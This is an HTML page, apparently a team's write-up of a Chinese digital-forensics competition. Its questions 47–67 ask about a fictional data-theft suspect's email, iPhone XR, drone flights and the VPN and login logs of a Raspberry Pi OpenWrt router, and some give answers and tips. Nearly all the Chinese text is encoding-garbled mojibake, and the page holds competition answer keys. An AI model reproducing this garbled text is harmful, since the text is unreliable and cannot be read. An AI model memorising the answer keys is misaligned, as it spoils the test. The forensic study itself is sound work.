å›ç­”å®ƒçš„é¦–ï¼˜ä½æ•°å€¼ã€‚(ä»¥å¤§å†™è‹±æ–‡å’Œé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚ 4GEF90GD)    2    å¡«ç©º"></a>47    ç‹æ™¯æµ©æ›¾ç»å†’å……AGCå…¬å¸å‘˜å·¥ â€˜Carsonâ€™ å‘é€ç”µé‚®ç»™AGC å®¢æˆ·ï¼Œè¿™å°ç”µé‚®çš„ â€˜Message-IDâ€™ æ˜¯ä»€ä¹ˆ? å›ç­”å®ƒçš„é¦–ï¼˜ä½æ•°å€¼ã€‚(ä»¥å¤§å†™è‹±æ–‡å’Œé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚ 4GEF90GD)    2    å¡«ç©º</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-191849857.png" class="">  <h1 id="48-ç‹æ™¯æµ©é‡‡ç”¨è®¡ç®—æœºé‡Œçš„å“ªç§å·¥å…·è¿›å…¥å’Œç›—å–AGCå…¬å¸çš„æ•°æ®-2"><a href="#48-ç‹æ™¯æµ©é‡‡ç”¨è®¡ç®—æœºé‡Œçš„å“ªç§å·¥å…·è¿›å…¥å’Œç›—å–AGCå…¬å¸çš„æ•°æ®-2" class="headerlink" title="48    ç‹æ™¯æµ©é‡‡ç”¨è®¡ç®—æœºé‡Œçš„å“ªç§å·¥å…·è¿›å…¥å’Œç›—å–AGCå…¬å¸çš„æ•°æ®?    2"></a>48    ç‹æ™¯æµ©é‡‡ç”¨è®¡ç®—æœºé‡Œçš„å“ªç§å·¥å…·è¿›å…¥å’Œç›—å–AGCå…¬å¸çš„æ•°æ®?    2</h1><p>å¤šé€‰    A:Teamviewer;<br>B;OpenVPN;C;Remote Desktop Manager;<br>D:Tor Browser<br>ABC</p><h1 id="49-ç‹æ™¯æµ©åœ¨AGCå…¬å¸ç›—å–äº†ä¸‹åˆ—ä»€ä¹ˆç±»å‹çš„æ¡£æ¡ˆ-2"><a href="#49-ç‹æ™¯æµ©åœ¨AGCå…¬å¸ç›—å–äº†ä¸‹åˆ—ä»€ä¹ˆç±»å‹çš„æ¡£æ¡ˆ-2" class="headerlink" title="49    ç‹æ™¯æµ©åœ¨AGCå…¬å¸ç›—å–äº†ä¸‹åˆ—ä»€ä¹ˆç±»å‹çš„æ¡£æ¡ˆ?    2"></a>49    ç‹æ™¯æµ©åœ¨AGCå…¬å¸ç›—å–äº†ä¸‹åˆ—ä»€ä¹ˆç±»å‹çš„æ¡£æ¡ˆ?    2</h1><p>å¤šé€‰    A:ost;<br>B:xlsx;<br>C:jpg;<br>D:docx<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-191446885.png" class=""><br>AB</p><h1 id="50-ç‹æ™¯æµ©çš„è®¡ç®—æœºäº2022å¹´9æœˆ29æ—¥æ›¾ç»æ¥ä¸Šä¸€ä¸ªè™šæ‹Ÿä¸“ç”¨ç½‘ç»œ-Virtual-Private-Network-VPN-ï¼Œè¿™ä¸ªVPNçš„IPåœ°å€æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„-â€˜-â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2-å¡«ç©º"><a href="#50-ç‹æ™¯æµ©çš„è®¡ç®—æœºäº2022å¹´9æœˆ29æ—¥æ›¾ç»æ¥ä¸Šä¸€ä¸ªè™šæ‹Ÿä¸“ç”¨ç½‘ç»œ-Virtual-Private-Network-VPN-ï¼Œè¿™ä¸ªVPNçš„IPåœ°å€æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„-â€˜-â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2-å¡«ç©º" class="headerlink" title="50    ç‹æ™¯æµ©çš„è®¡ç®—æœºäº2022å¹´9æœˆ29æ—¥æ›¾ç»æ¥ä¸Šä¸€ä¸ªè™šæ‹Ÿä¸“ç”¨ç½‘ç»œ (Virtual Private Network - VPN)ï¼Œè¿™ä¸ªVPNçš„IPåœ°å€æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„ â€˜.â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    2    å¡«ç©º"></a>50    ç‹æ™¯æµ©çš„è®¡ç®—æœºäº2022å¹´9æœˆ29æ—¥æ›¾ç»æ¥ä¸Šä¸€ä¸ªè™šæ‹Ÿä¸“ç”¨ç½‘ç»œ (Virtual Private Network - VPN)ï¼Œè¿™ä¸ªVPNçš„IPåœ°å€æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„ â€˜.â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    2    å¡«ç©º</h1><p>é‚®ç®±é‡Œæœ‰,ä¹‹ååšé¢˜å¯ä»¥ç›´æ¥å…ˆæŠŠé‚®ç®±é™„ä»¶éƒ½ç»™æå‡ºæ¥ä¸€ä¸‹<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-211454187.png" class="">  </p><h1 id="51-è£…ç½®-â€˜ã€ŒKingHooã€çš„iPhoneâ€™-çš„è“ç‰™åª’ä½“è®¿é—®æ§åˆ¶åœ°å€-MAC-Address-æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„-â€˜ï¼šâ€™-æˆ–-â€˜-â€˜-ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º"><a href="#51-è£…ç½®-â€˜ã€ŒKingHooã€çš„iPhoneâ€™-çš„è“ç‰™åª’ä½“è®¿é—®æ§åˆ¶åœ°å€-MAC-Address-æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„-â€˜ï¼šâ€™-æˆ–-â€˜-â€˜-ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º" class="headerlink" title="51    è£…ç½® â€˜ã€ŒKingHooã€çš„iPhoneâ€™ çš„è“ç‰™åª’ä½“è®¿é—®æ§åˆ¶åœ°å€ (MAC Address) æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„ â€˜ï¼šâ€™ æˆ– â€˜-â€˜ ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º"></a>51    è£…ç½® â€˜ã€ŒKingHooã€çš„iPhoneâ€™ çš„è“ç‰™åª’ä½“è®¿é—®æ§åˆ¶åœ°å€ (MAC Address) æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„ â€˜ï¼šâ€™ æˆ– â€˜-â€˜ ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º</h1><p>c81ee74af933</p><h1 id="52-ç‹æ™¯æµ©ä½•æ—¶å°†-â€˜å°å®â€™-åŠ ä¸ºiPhone-XRçš„æ‰‹æœºè”ç»œäºº-Contact-ä»¥æ—¶åŒºUTC-8å›ç­”-1"><a href="#52-ç‹æ™¯æµ©ä½•æ—¶å°†-â€˜å°å®â€™-åŠ ä¸ºiPhone-XRçš„æ‰‹æœºè”ç»œäºº-Contact-ä»¥æ—¶åŒºUTC-8å›ç­”-1" class="headerlink" title="52    ç‹æ™¯æµ©ä½•æ—¶å°† â€˜å°å®â€™ åŠ ä¸ºiPhone XRçš„æ‰‹æœºè”ç»œäºº (Contact) ? (ä»¥æ—¶åŒºUTC +8å›ç­”)    1"></a>52    ç‹æ™¯æµ©ä½•æ—¶å°† â€˜å°å®â€™ åŠ ä¸ºiPhone XRçš„æ‰‹æœºè”ç»œäºº (Contact) ? (ä»¥æ—¶åŒºUTC +8å›ç­”)    1</h1><p>å•é€‰<br>A:2022å¹´07æœˆ14æ—¥;<br>B:2022å¹´07æœˆ15æ—¥;<br>C:2022å¹´07æœˆ16æ—¥;<br>D:2022å¹´07æœˆ17æ—¥;<br>E:2022å¹´07æœˆ18æ—¥;</p><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-213543480.png" class="">  <p>A</p><h1 id="53-ç‹æ™¯æµ©çš„iPhone-XRæ˜¾ç¤ºä»–çš„æ±‡ä¸°é“¶è¡Œæˆ·å£äº2022å¹´9æœˆ19æ—¥æ”¶åˆ°å¤šå°‘å­˜æ¬¾-1"><a href="#53-ç‹æ™¯æµ©çš„iPhone-XRæ˜¾ç¤ºä»–çš„æ±‡ä¸°é“¶è¡Œæˆ·å£äº2022å¹´9æœˆ19æ—¥æ”¶åˆ°å¤šå°‘å­˜æ¬¾-1" class="headerlink" title="53    ç‹æ™¯æµ©çš„iPhone XRæ˜¾ç¤ºä»–çš„æ±‡ä¸°é“¶è¡Œæˆ·å£äº2022å¹´9æœˆ19æ—¥æ”¶åˆ°å¤šå°‘å­˜æ¬¾?    1"></a>53    ç‹æ™¯æµ©çš„iPhone XRæ˜¾ç¤ºä»–çš„æ±‡ä¸°é“¶è¡Œæˆ·å£äº2022å¹´9æœˆ19æ—¥æ”¶åˆ°å¤šå°‘å­˜æ¬¾?    1</h1><p>å•é€‰<br>A:HKD298.8;<br>B:HKD344.7;<br>C:HKD396;<br>D:HKD543;<br>E:HKD465.1</p><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-213643555.png" class="">  <p>B</p><h1 id="54-ç‹æ™¯æµ©çš„iPhone-XRæ²¡æœ‰æ”¶è—-Bookmark-å“ªå®¶éŸ³å“å“ç‰Œçš„ç½‘é¡µ-1"><a href="#54-ç‹æ™¯æµ©çš„iPhone-XRæ²¡æœ‰æ”¶è—-Bookmark-å“ªå®¶éŸ³å“å“ç‰Œçš„ç½‘é¡µ-1" class="headerlink" title="54    ç‹æ™¯æµ©çš„iPhone XRæ²¡æœ‰æ”¶è— (Bookmark) å“ªå®¶éŸ³å“å“ç‰Œçš„ç½‘é¡µ?    1"></a>54    ç‹æ™¯æµ©çš„iPhone XRæ²¡æœ‰æ”¶è— (Bookmark) å“ªå®¶éŸ³å“å“ç‰Œçš„ç½‘é¡µ?    1</h1><p>å•é€‰<br>A:KEF;<br>B:EDIFIER;<br>C:BOSE;<br>D:YAMAHA;<br>E:Bowers &amp; Wilkins    </p><h1 id="55-ç‹æ™¯æµ©çš„iPhone-XRæ‰‹æœºè®°å½•äº†ä»–æ›¾äº2022å¹´8æœˆ26æ—¥è¯•é£æ— äººæœºï¼Œ-å½“å¤©è¯•é£çš„åœ°ç‚¹åœ¨å“ªé‡Œ-2"><a href="#55-ç‹æ™¯æµ©çš„iPhone-XRæ‰‹æœºè®°å½•äº†ä»–æ›¾äº2022å¹´8æœˆ26æ—¥è¯•é£æ— äººæœºï¼Œ-å½“å¤©è¯•é£çš„åœ°ç‚¹åœ¨å“ªé‡Œ-2" class="headerlink" title="55    ç‹æ™¯æµ©çš„iPhone XRæ‰‹æœºè®°å½•äº†ä»–æ›¾äº2022å¹´8æœˆ26æ—¥è¯•é£æ— äººæœºï¼Œ å½“å¤©è¯•é£çš„åœ°ç‚¹åœ¨å“ªé‡Œ?    2"></a>55    ç‹æ™¯æµ©çš„iPhone XRæ‰‹æœºè®°å½•äº†ä»–æ›¾äº2022å¹´8æœˆ26æ—¥è¯•é£æ— äººæœºï¼Œ å½“å¤©è¯•é£çš„åœ°ç‚¹åœ¨å“ªé‡Œ?    2</h1><p>å•é€‰<br>A:å¤§åŸ”æµ·æ»¨;<br>B:å¯å¾·;<br>C:æ•°ç æ¸¯;<br>D:è¥¿ç¯;<br>E:å°†å†›æ¾³<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-220858510.png" class=""><br>åƒè¿™ç§æ‰‹æœºå¥—æ— äººæœºçš„åŸºæœ¬éƒ½æ˜¯å¤§ç–†,æ‰€ä»¥ç›´æ¥å†åº”ç”¨åˆ—è¡¨é‡ŒæœDjiæˆ–è€…flyåº”è¯¥å¯ä»¥æœåˆ°,æ— äººæœºçš„app<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-220948941.png" class="">  </p><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-222717954.png" class="">  <p>åœ¨é€šè¿‡ç›´æ¥åœ¨æ–‡ä»¶é‡Œæœç´¢djiå¯ä»¥æ‰¾åˆ°ä¸€äº›å¤§ç–†çš„dbæ–‡ä»¶ã€‚è¿™æ ·å°±å¯ä»¥æ‰¾åˆ°djiappæ•°æ®å­˜å‚¨çš„æ–‡ä»¶å¤¹ï¼Œå°†å…¶å¯¼å‡ºä¸¢åˆ°ç‰©è”ç½‘å–è¯ä¸­<br>å®šä½å…¶ä»–appçš„ç›®å½•åº”è¯¥ä¹Ÿå¯ä»¥ç”¨è¿™ç§æ€è·¯</p><h1 id="56-ç‹æ™¯æµ©äº2022å¹´8æœˆ26æ—¥è¯•é£æ— äººæœºçš„æ€»é£è¡Œæ—¶é—´-Total-Flight-Time-å¤šä¹…-2"><a href="#56-ç‹æ™¯æµ©äº2022å¹´8æœˆ26æ—¥è¯•é£æ— äººæœºçš„æ€»é£è¡Œæ—¶é—´-Total-Flight-Time-å¤šä¹…-2" class="headerlink" title="56    ç‹æ™¯æµ©äº2022å¹´8æœˆ26æ—¥è¯•é£æ— äººæœºçš„æ€»é£è¡Œæ—¶é—´ (Total Flight Time) å¤šä¹…?    2"></a>56    ç‹æ™¯æµ©äº2022å¹´8æœˆ26æ—¥è¯•é£æ— äººæœºçš„æ€»é£è¡Œæ—¶é—´ (Total Flight Time) å¤šä¹…?    2</h1><p>å•é€‰<br>A:6åˆ†58ç§’;<br>B:8åˆ†10ç§’;<br>C:9åˆ†6ç§’;<br>D:11åˆ†1ç§’;<br>E:15åˆ†33ç§’    </p><h1 id="57-ç‹æ™¯æµ©ç”¨-iPhone-XR-æ‹äº†ä¸€å¼ ç…§ç‰‡â€™IMG-0012-HEICâ€™ï¼Œé‚£ç…§ç‰‡ä»€ä¹ˆåœ°æ–¹æ›¾è¢«ä¿®æ”¹-3"><a href="#57-ç‹æ™¯æµ©ç”¨-iPhone-XR-æ‹äº†ä¸€å¼ ç…§ç‰‡â€™IMG-0012-HEICâ€™ï¼Œé‚£ç…§ç‰‡ä»€ä¹ˆåœ°æ–¹æ›¾è¢«ä¿®æ”¹-3" class="headerlink" title="57    ç‹æ™¯æµ©ç”¨ iPhone XR æ‹äº†ä¸€å¼ ç…§ç‰‡â€™IMG_0012.HEICâ€™ï¼Œé‚£ç…§ç‰‡ä»€ä¹ˆåœ°æ–¹æ›¾è¢«ä¿®æ”¹?    3"></a>57    ç‹æ™¯æµ©ç”¨ iPhone XR æ‹äº†ä¸€å¼ ç…§ç‰‡â€™IMG_0012.HEICâ€™ï¼Œé‚£ç…§ç‰‡ä»€ä¹ˆåœ°æ–¹æ›¾è¢«ä¿®æ”¹?    3</h1><p>å¤šé€‰    A:æ‹æ‘„æ—¶é—´;<br>B:ç»çº¬åº¦;<br>C:æ—¶åŒº;<br>D:æ¡£æ¡ˆåç§°;<br>E:æ‹æ‘„è£…å¤‡    </p><h1 id="58-æ‰¿ä¸Šé¢˜ï¼Œé‚£å¼ ç…§ç‰‡ä¿®æ”¹åçš„ç»çº¬åº¦æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„-â€˜-â€™ï¼Œå°†ç»çº¬åº¦åˆå¹¶å›ç­”ã€‚-å¦‚-22-2846135-114-1739116ï¼Œéœ€å›ç­”-2228461351141739116-3-å¡«ç©º"><a href="#58-æ‰¿ä¸Šé¢˜ï¼Œé‚£å¼ ç…§ç‰‡ä¿®æ”¹åçš„ç»çº¬åº¦æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„-â€˜-â€™ï¼Œå°†ç»çº¬åº¦åˆå¹¶å›ç­”ã€‚-å¦‚-22-2846135-114-1739116ï¼Œéœ€å›ç­”-2228461351141739116-3-å¡«ç©º" class="headerlink" title="58    æ‰¿ä¸Šé¢˜ï¼Œé‚£å¼ ç…§ç‰‡ä¿®æ”¹åçš„ç»çº¬åº¦æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„ â€˜.â€™ï¼Œå°†ç»çº¬åº¦åˆå¹¶å›ç­”ã€‚ å¦‚ 22.2846135 114.1739116ï¼Œéœ€å›ç­” 2228461351141739116)    3    å¡«ç©º"></a>58    æ‰¿ä¸Šé¢˜ï¼Œé‚£å¼ ç…§ç‰‡ä¿®æ”¹åçš„ç»çº¬åº¦æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„ â€˜.â€™ï¼Œå°†ç»çº¬åº¦åˆå¹¶å›ç­”ã€‚ å¦‚ 22.2846135 114.1739116ï¼Œéœ€å›ç­” 2228461351141739116)    3    å¡«ç©º</h1><h1 id="59-æœ—å°¼è‰è“-Raspberry-è®¡ç®—æœºæ“ä½œç³»ç»Ÿçš„ä¸»æœºåç§°-hostname-æ˜¯ä»€ä¹ˆ-1"><a href="#59-æœ—å°¼è‰è“-Raspberry-è®¡ç®—æœºæ“ä½œç³»ç»Ÿçš„ä¸»æœºåç§°-hostname-æ˜¯ä»€ä¹ˆ-1" class="headerlink" title="59    æœ—å°¼è‰è“ (Raspberry) è®¡ç®—æœºæ“ä½œç³»ç»Ÿçš„ä¸»æœºåç§° (hostname) æ˜¯ä»€ä¹ˆ?    1"></a>59    æœ—å°¼è‰è“ (Raspberry) è®¡ç®—æœºæ“ä½œç³»ç»Ÿçš„ä¸»æœºåç§° (hostname) æ˜¯ä»€ä¹ˆ?    1</h1><p>å•é€‰<br>A:OpenWrt;<br>B:admin;<br>C:root;<br>D:AsusRt;<br>E:DDwrt    </p><h1 id="60-ä»¥ä¸‹å“ªé¡¹å¯¹äºæœ—å°¼è‰è“è®¡ç®—æœºæ“ä½œç³»ç»Ÿçš„æè¿°æ˜¯æ­£ç¡®çš„-2"><a href="#60-ä»¥ä¸‹å“ªé¡¹å¯¹äºæœ—å°¼è‰è“è®¡ç®—æœºæ“ä½œç³»ç»Ÿçš„æè¿°æ˜¯æ­£ç¡®çš„-2" class="headerlink" title="60    ä»¥ä¸‹å“ªé¡¹å¯¹äºæœ—å°¼è‰è“è®¡ç®—æœºæ“ä½œç³»ç»Ÿçš„æè¿°æ˜¯æ­£ç¡®çš„?    2"></a>60    ä»¥ä¸‹å“ªé¡¹å¯¹äºæœ—å°¼è‰è“è®¡ç®—æœºæ“ä½œç³»ç»Ÿçš„æè¿°æ˜¯æ­£ç¡®çš„?    2</h1><p>å¤šé€‰    A:LANåœ°å€æ˜¯ 192.168.1.24;<br>B:æä¾›ç‚¹å¯¹ç‚¹éš§é“åè®® (Point-to-Point Tunneling Protocol - PPTP) VPNæœåŠ¡;<br>C:WIFIç™»å½•å¯†ç ä¸ºâ€™OpenWrtâ€™;<br>D:æä¾›ç½‘ç»œæ—¶é—´åè®® (NTP) æœåŠ¡;<br>E:æ—¶åŒºè®¾ç½®ç›¸ç­‰äºUTC+8    </p><h1 id="61-æ‰¿ä¸Šé¢˜ï¼Œâ€™VPNâ€™-æœåŠ¡å™¨çš„IPåœ°å€åŠç«¯å£-Port-æ˜¯ä»€ä¹ˆ-2"><a href="#61-æ‰¿ä¸Šé¢˜ï¼Œâ€™VPNâ€™-æœåŠ¡å™¨çš„IPåœ°å€åŠç«¯å£-Port-æ˜¯ä»€ä¹ˆ-2" class="headerlink" title="61    æ‰¿ä¸Šé¢˜ï¼Œâ€™VPNâ€™ æœåŠ¡å™¨çš„IPåœ°å€åŠç«¯å£ (Port) æ˜¯ä»€ä¹ˆ?    2"></a>61    æ‰¿ä¸Šé¢˜ï¼Œâ€™VPNâ€™ æœåŠ¡å™¨çš„IPåœ°å€åŠç«¯å£ (Port) æ˜¯ä»€ä¹ˆ?    2</h1><p>å¤šé€‰    A:IPåœ°å€ 61.238.217.108;<br>B:IPåœ°å€ 192.168.8.1;<br>C:IPåœ°å€ 103.10.12.106;<br>D:ç«¯å£ 33248;<br>E:ç«¯å£ 1194;F:ç«¯å£ 1701    </p><h1 id="62-æœ—å°¼è‰è“è®¡ç®—æœºæ“ä½œç³»ç»Ÿè®¾å®šäº†ä¸€ä¸ªæ¡£æ¡ˆæ¥å‚¨å­˜ç³»ç»Ÿçš„-â€˜elog-filâ€™-ï¼Œæ¡£æ¡ˆåç§°æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥-â€˜-â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ã€‚å¦‚-Cat10-jpgï¼Œéœ€å›ç­”CAT10JPG-2-å¡«ç©º"><a href="#62-æœ—å°¼è‰è“è®¡ç®—æœºæ“ä½œç³»ç»Ÿè®¾å®šäº†ä¸€ä¸ªæ¡£æ¡ˆæ¥å‚¨å­˜ç³»ç»Ÿçš„-â€˜elog-filâ€™-ï¼Œæ¡£æ¡ˆåç§°æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥-â€˜-â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ã€‚å¦‚-Cat10-jpgï¼Œéœ€å›ç­”CAT10JPG-2-å¡«ç©º" class="headerlink" title="62    æœ—å°¼è‰è“è®¡ç®—æœºæ“ä½œç³»ç»Ÿè®¾å®šäº†ä¸€ä¸ªæ¡£æ¡ˆæ¥å‚¨å­˜ç³»ç»Ÿçš„ â€˜elog_filâ€™ ï¼Œæ¡£æ¡ˆåç§°æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ â€˜.â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ã€‚å¦‚ Cat10.jpgï¼Œéœ€å›ç­”CAT10JPG)    2    å¡«ç©º"></a>62    æœ—å°¼è‰è“è®¡ç®—æœºæ“ä½œç³»ç»Ÿè®¾å®šäº†ä¸€ä¸ªæ¡£æ¡ˆæ¥å‚¨å­˜ç³»ç»Ÿçš„ â€˜elog_filâ€™ ï¼Œæ¡£æ¡ˆåç§°æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ â€˜.â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ã€‚å¦‚ Cat10.jpgï¼Œéœ€å›ç­”CAT10JPG)    2    å¡«ç©º</h1><h1 id="63-æ‰¿ä¸Šé¢˜ï¼Œæ£€è§†ä¸Šè¿°çš„æ¡£æ¡ˆï¼Œå½“ä¸­æœ‰å‡ ä¸ªIPåœ°å€æ›¾ç»æˆåŠŸç™»å½•è¿™ä¸ªç³»ç»Ÿçš„-â€˜VPNâ€™-æœåŠ¡-3"><a href="#63-æ‰¿ä¸Šé¢˜ï¼Œæ£€è§†ä¸Šè¿°çš„æ¡£æ¡ˆï¼Œå½“ä¸­æœ‰å‡ ä¸ªIPåœ°å€æ›¾ç»æˆåŠŸç™»å½•è¿™ä¸ªç³»ç»Ÿçš„-â€˜VPNâ€™-æœåŠ¡-3" class="headerlink" title="63    æ‰¿ä¸Šé¢˜ï¼Œæ£€è§†ä¸Šè¿°çš„æ¡£æ¡ˆï¼Œå½“ä¸­æœ‰å‡ ä¸ªIPåœ°å€æ›¾ç»æˆåŠŸç™»å½•è¿™ä¸ªç³»ç»Ÿçš„ â€˜VPNâ€™ æœåŠ¡?    3"></a>63    æ‰¿ä¸Šé¢˜ï¼Œæ£€è§†ä¸Šè¿°çš„æ¡£æ¡ˆï¼Œå½“ä¸­æœ‰å‡ ä¸ªIPåœ°å€æ›¾ç»æˆåŠŸç™»å½•è¿™ä¸ªç³»ç»Ÿçš„ â€˜VPNâ€™ æœåŠ¡?    3</h1><p>å•é€‰<br>A:1;<br>B:2;<br>C:3;<br>D:4;<br>E:0    </p><h1 id="64-æ‰¿ä¸Šé¢˜ï¼Œæ£€è§†ä¸Šè¿°çš„æ¡£æ¡ˆï¼Œå½“ä¸­æœ‰å‡ ä¸ªIPåœ°å€æ›¾ç»å°è¯•ä»¥-â€˜rootâ€™-ç™»å…¥è£…ç½®ä½†å› å¯†ç é”™è¯¯è€Œä¸æˆåŠŸ-2"><a href="#64-æ‰¿ä¸Šé¢˜ï¼Œæ£€è§†ä¸Šè¿°çš„æ¡£æ¡ˆï¼Œå½“ä¸­æœ‰å‡ ä¸ªIPåœ°å€æ›¾ç»å°è¯•ä»¥-â€˜rootâ€™-ç™»å…¥è£…ç½®ä½†å› å¯†ç é”™è¯¯è€Œä¸æˆåŠŸ-2" class="headerlink" title="64    æ‰¿ä¸Šé¢˜ï¼Œæ£€è§†ä¸Šè¿°çš„æ¡£æ¡ˆï¼Œå½“ä¸­æœ‰å‡ ä¸ªIPåœ°å€æ›¾ç»å°è¯•ä»¥ â€˜rootâ€™ ç™»å…¥è£…ç½®ä½†å› å¯†ç é”™è¯¯è€Œä¸æˆåŠŸ?    2"></a>64    æ‰¿ä¸Šé¢˜ï¼Œæ£€è§†ä¸Šè¿°çš„æ¡£æ¡ˆï¼Œå½“ä¸­æœ‰å‡ ä¸ªIPåœ°å€æ›¾ç»å°è¯•ä»¥ â€˜rootâ€™ ç™»å…¥è£…ç½®ä½†å› å¯†ç é”™è¯¯è€Œä¸æˆåŠŸ?    2</h1><p>å•é€‰<br>A:2;<br>B:4;<br>C:5;<br>D:6;<br>E:8    </p><h1 id="65-æ ¹æ®è£…ç½®çš„è¿‡å¾€è®°å½•ï¼Œâ€™log-fileâ€™-æ˜¯è®¾åœ¨-â€˜usr-rooney-â€˜-çš„å“ªä¸ªå·²è¢«åˆ é™¤çš„å­æ–‡ä»¶å¤¹é‡Œ-Sub-Directory-ä»¥å¤§å†™è‹±æ–‡å›ç­”-3-å¡«ç©º"><a href="#65-æ ¹æ®è£…ç½®çš„è¿‡å¾€è®°å½•ï¼Œâ€™log-fileâ€™-æ˜¯è®¾åœ¨-â€˜usr-rooney-â€˜-çš„å“ªä¸ªå·²è¢«åˆ é™¤çš„å­æ–‡ä»¶å¤¹é‡Œ-Sub-Directory-ä»¥å¤§å†™è‹±æ–‡å›ç­”-3-å¡«ç©º" class="headerlink" title="65    æ ¹æ®è£…ç½®çš„è¿‡å¾€è®°å½•ï¼Œâ€™log_fileâ€™ æ˜¯è®¾åœ¨ â€˜usr/rooney/â€˜ çš„å“ªä¸ªå·²è¢«åˆ é™¤çš„å­æ–‡ä»¶å¤¹é‡Œ (Sub Directory)? (ä»¥å¤§å†™è‹±æ–‡å›ç­”)    3    å¡«ç©º"></a>65    æ ¹æ®è£…ç½®çš„è¿‡å¾€è®°å½•ï¼Œâ€™log_fileâ€™ æ˜¯è®¾åœ¨ â€˜usr/rooney/â€˜ çš„å“ªä¸ªå·²è¢«åˆ é™¤çš„å­æ–‡ä»¶å¤¹é‡Œ (Sub Directory)? (ä»¥å¤§å†™è‹±æ–‡å›ç­”)    3    å¡«ç©º</h1><h1 id="66-ç‹æ™¯æµ©-SD-è®°å¿†å¡-SD-Memory-Card-çš„å‚¨å­˜å®¹é‡æœ‰å¤šå°‘ä¸ªå­—èŠ‚-Byte-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º"><a href="#66-ç‹æ™¯æµ©-SD-è®°å¿†å¡-SD-Memory-Card-çš„å‚¨å­˜å®¹é‡æœ‰å¤šå°‘ä¸ªå­—èŠ‚-Byte-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º" class="headerlink" title="66    ç‹æ™¯æµ© SD è®°å¿†å¡ (SD Memory Card) çš„å‚¨å­˜å®¹é‡æœ‰å¤šå°‘ä¸ªå­—èŠ‚ (Byte) ? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º"></a>66    ç‹æ™¯æµ© SD è®°å¿†å¡ (SD Memory Card) çš„å‚¨å­˜å®¹é‡æœ‰å¤šå°‘ä¸ªå­—èŠ‚ (Byte) ? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º</h1><h1 id="67-æ£€è§†è®°å¿†å¡ä¸Šç¡¬ç›˜åˆ†åŒºè¡¨-Partition-Table-èµ„è®¯ï¼Œè®°å¿†å¡å…±æœ‰å¤šå°‘ä¸ªåˆ†åŒº-Partition-1"><a href="#67-æ£€è§†è®°å¿†å¡ä¸Šç¡¬ç›˜åˆ†åŒºè¡¨-Partition-Table-èµ„è®¯ï¼Œè®°å¿†å¡å…±æœ‰å¤šå°‘ä¸ªåˆ†åŒº-Partition-1" class="headerlink" title="67    æ£€è§†è®°å¿†å¡ä¸Šç¡¬ç›˜åˆ†åŒºè¡¨ (Partition Table) èµ„è®¯ï¼Œè®°å¿†å¡å…±æœ‰å¤šå°‘ä¸ªåˆ†åŒº (Partition) ?    1"></a>67    æ£€è§†è®°å¿†å¡ä¸Šç¡¬ç›˜åˆ†åŒºè¡¨ (Partition Table) èµ„è®¯ï¼Œè®°å¿†å¡å…±æœ‰å¤šå°‘ä¸ªåˆ†åŒº (Partition) ?    